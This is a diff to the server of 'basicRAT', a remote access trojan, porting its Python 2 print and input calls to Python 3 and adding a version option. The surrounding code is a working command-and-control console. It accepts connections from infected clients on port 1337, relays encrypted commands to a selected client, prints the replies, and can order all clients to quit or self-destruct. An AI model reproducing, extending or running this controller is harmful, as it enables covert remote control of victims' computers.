@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 #
 # basicRAT server
@@ -13,6 +14,8 @@ import threading
 
 from core.crypto import encrypt, decrypt, diffiehellman
 
+
+__version__ = '0.3'
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -74,21 +77,21 @@ class Server(threading.Thread):
             enc_message = encrypt(message, client.dhkey)
             client.conn.send(enc_message)
         except Exception as e:
-            print 'Error: {}'.format(e)
+            print('Error: {}'.format(e))
 
     def recv_client(self, client):
         try:
             recv_data = client.conn.recv(4096)
-            print decrypt(recv_data, client.dhkey)
+            print(decrypt(recv_data, client.dhkey))
         except Exception as e:
-            print 'Error: {}'.format(e)
+            print('Error: {}'.format(e))
 
     def select_client(self, client_id):
         try:
             self.current_client = self.clients[int(client_id)]
-            print 'Client {} selected.'.format(client_id)
+            print('Client {} selected.'.format(client_id))
         except (KeyError, ValueError):
-            print 'Error: Invalid Client ID.'
+            print('Error: Invalid Client ID.')
 
     def remove_client(self, key):
         return self.clients.pop(key, None)
@@ -109,12 +112,12 @@ class Server(threading.Thread):
         return [v for _, v in self.clients.items()]
 
     def list_clients(self, _):
-        print 'ID | Client Address\n-------------------'
+        print('ID | Client Address\n-------------------')
         for k, v in self.clients.items():
-            print '{:>2} | {}'.format(k, v.addr[0])
+            print('{:>2} | {}'.format(k, v.addr[0]))
 
     def quit_server(self, _):
-        if raw_input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
+        if input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
             for c in self.get_clients():
                 self.send_client('quit', c)
             self.s.shutdown(socket.SHUT_RDWR)
@@ -122,7 +125,7 @@ class Server(threading.Thread):
             sys.exit(0)
 
     def goodbye_server(self, _):
-        if raw_input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
+        if input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
             for c in self.get_clients():
                 self.send_client('selfdestruct', c)
             self.s.shutdown(socket.SHUT_RDWR)
@@ -130,7 +133,7 @@ class Server(threading.Thread):
             sys.exit(0)
 
     def print_help(self, _):
-        print HELP_TEXT
+        print(HELP_TEXT)
 
 
 class ClientConnection():
@@ -143,24 +146,31 @@ class ClientConnection():
 
 def get_parser():
     parser = argparse.ArgumentParser(description='basicRAT server')
-    parser.add_argument('-p', '--port', help='Port to listen on.',
+    parser.add_argument('-p', '--port', help='port to listen on',
                         default=1337, type=int)
+    parser.add_argument('-v', '--version', help='display the current version',
+                        action='store_true')
     return parser
 
 
 def main():
     parser = get_parser()
     args   = vars(parser.parse_args())
+
+    if args['version']:
+        print('basicRAT %s' % __version__)
+        return
+
     port   = args['port']
     client = None
 
-    print BANNER
+    print(BANNER)
 
     # start server
     server = Server(port)
     server.setDaemon(True)
     server.start()
-    print 'basicRAT server listening for connections on port {}.'.format(port)
+    print('basicRAT server listening for connections on port {}.'.format(port))
 
     # server side commands
     server_commands = {
@@ -192,7 +202,7 @@ def main():
         else:
             ccid = '?'
 
-        prompt = raw_input('\n[{}] basicRAT> '.format(ccid)).rstrip()
+        prompt = input('\n[{}] basicRAT> '.format(ccid)).rstrip()
 
         # allow noop
         if not prompt:
@@ -205,18 +215,18 @@ def main():
             if cmd in ['client', 'clients', 'help', 'quit'] or ccid != '?':
                 server_commands[cmd](action)
             else:
-                print 'Error: No client selected.'
+                print('Error: No client selected.')
 
         elif cmd in CLIENT_COMMANDS:
             if ccid != '?':
-                print 'Running {}...'.format(cmd)
+                print('Running {}...'.format(cmd))
                 server.send_client(prompt, server.current_client)
                 server.recv_client(server.current_client)
             else:
-                print 'Error: No client selected.'
+                print('Error: No client selected.')
 
         else:
-            print 'Invalid command, type "help" to see a list of commands.'
+            print('Invalid command, type "help" to see a list of commands.')
 
 
 if __name__ == '__main__':
